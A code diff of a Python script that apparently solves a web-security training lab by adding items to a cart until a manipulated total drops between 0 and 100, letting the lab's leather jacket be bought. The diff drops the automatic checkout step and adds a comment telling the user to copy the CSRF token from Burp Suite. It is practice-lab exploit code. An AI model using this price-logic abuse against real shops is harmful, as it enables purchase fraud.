@@ -17,7 +17,7 @@ header = {
 
 # Define the CSRF token
 csrf = {
-    'csrf': 'CSRF-HERE'  # <<< Replace with your CSRF token for secure requests
+    'csrf': 'CSRF-HERE'  # <<< Replace with your CSRF token for secure requests "Checkout any product to get it in the http request in burpsuite"
 }
 
 # Define the data to add a product to the cart
@@ -51,8 +51,7 @@ def product_price():
     :return: The price of the product as an integer
     """
     response = requests.get(url=urls['product'], headers=header)  # Send a GET request to fetch product details
-    response_content = response.content.decode('utf-8')  # Decode the response content to a string
-    price = re.findall(r'"price">\$(\d*).?\d*', response_content)  # Extract the product price using regex
+    price = re.findall(r'"price">\$(\d*).?\d*', response.text)  # Extract the product price using regex
     if price:
         price = int(''.join(price).replace('$', ''))  # Convert the price to an integer
     else:
@@ -65,25 +64,12 @@ def get_total_price():
     :return: The total price as an integer
     """
     response = requests.get(url=urls['cart'], headers=header)  # Send a GET request to fetch cart details
-    response_content = response.content.decode('utf-8')  # Decode the response content to a string
-    total = re.findall(r'<th>Total:</th>\s*<th>(-?\$\d*).?\d*</th>', response_content)  # Extract the total price using regex
+    total = re.findall(r'<th>Total:</th>\s*<th>(-?\$\d*).?\d*</th>', response.text)  # Extract the total price using regex
     if total:
         total = int(''.join(total).replace('$', ''))  # Convert the total price to an integer
     else:
         total = 0  # Default total if not found
     return total
-
-def checkout():  
-    """
-    Checkout the cart and complete the purchase.
-    """
-    try:
-        # Send a POST request to checkout the cart
-        requests.post(url=urls['checkout'], data=csrf, headers=header)
-        print("Checked out successfully.")
-        print("You bought the Leather Jacket successfully, and you probably solved the lab!")
-    except:
-        print("Failed to checkout.")
 
 def start():  
     """
@@ -100,7 +86,7 @@ def start():
                 total_price = get_total_price()  # Fetch the current total price in the cart
                 
                 if total_price > 0 and total_price <= 100:  # Check if the total price is within the desired range
-                    print("- Total price is within the desired range amount!\n- Now you're able to checkout your products!")
+                    print('- Total price is within the desired range amount!\n- Now you\'re able to checkout the "Lightweight l33t leather jacket"!\n- I know it\'s more fun to buy it by yourself😉')
                     break_all = True  # Set the flag to break out of all loops
                     break
                 elif total_price + (product_price() * data['quantity']) > 100:  # Check if adding more products exceeds the limit
